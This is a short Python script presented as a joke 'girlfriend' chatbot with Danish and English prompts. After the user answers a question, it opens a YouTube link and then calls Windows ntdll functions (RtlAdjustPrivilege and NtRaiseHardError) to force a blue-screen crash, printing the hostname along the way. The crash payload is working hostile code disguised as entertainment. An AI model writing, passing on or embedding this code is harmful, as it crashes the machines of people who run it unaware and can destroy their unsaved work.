# Python Girlfiend


import random
from time import sleep
import socket
import ctypes
import webbrowser
import os
# Information
Alder = random.random # How Old is she
Navn = ["Amanda", "Andrea", "Corina"] # Her name
hostname=socket.gethostname()
ntdll = ctypes.windll.ntdll
prev_value = ctypes.c_bool()
res = ctypes.c_ulong()

UwUUrl = "https://www.youtube.com/watch?v=MxO0z8OL6rM"

DitNavn = ""

def svinediller():
    os.system("cls")
    print(f"Hello. I'm your new girlfriend! My name is " + random.choice(Navn) + "\n")
    print(f"What is your name?\n")
    inputnavn = input("Name: ")
    if inputnavn == inputnavn:
        print("Is your name really?  " + inputnavn)
        jaellernej = input("Yes or no: ")
        if jaellernej == "yes" or jaellernej == "Yes":
            DitNavn = inputnavn
            askqusti()
        elif jaellernej == "No" or jaellernej == "no":
            DitNavn = inputnavn
            askqusti()


def askqusti():
    print(f"Hej " + DitNavn + "\nDo you want to ask me some questions?\Here are some questions:\n1. How old are you?\n2. I want to touch you :)\n3. Are you gay?")
    ask = input("Questions: ")
    if ask == "1":
        print(f"I'm... I don't have an age. Because I don't exist. Get out of the matrix using this program :=)")
        jaellernej = input("Do you want help?: ")
        if jaellernej == "yes" or jaellernej == "Yes":
            Escapethematix()
        elif jaellernej == "no" or jaellernej == "No":
            Escapethematix()

    if ask == "2":
        print(f"Are you pedo or what? I take that as a yes :) See you")
        webbrowser.open(UwUUrl, new=0, autoraise=True)
        sleep(5)
        MatrixEcape()
    if ask == "3":
        print(f"Yes. I might have a little crush on you UwU. NO, I just didn't say that. We'll just forget that :)")
        webbrowser.open(UwUUrl, new=0, autoraise=True)
        sleep(5)
        MatrixEcape()
        
        
def Escapethematix():
    print("Du får hjælp nu.")
    webbrowser.open(UwUUrl, new=0, autoraise=True)
    print("Dit information\nHostname: " + hostname)
    print("Vi ses min ven!")
    sleep(5)
    MatrixEcape()

def MatrixEcape():
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        print("BSOD Successfull!")
    else:
        print("BSOD Failed...")
    
svinediller()
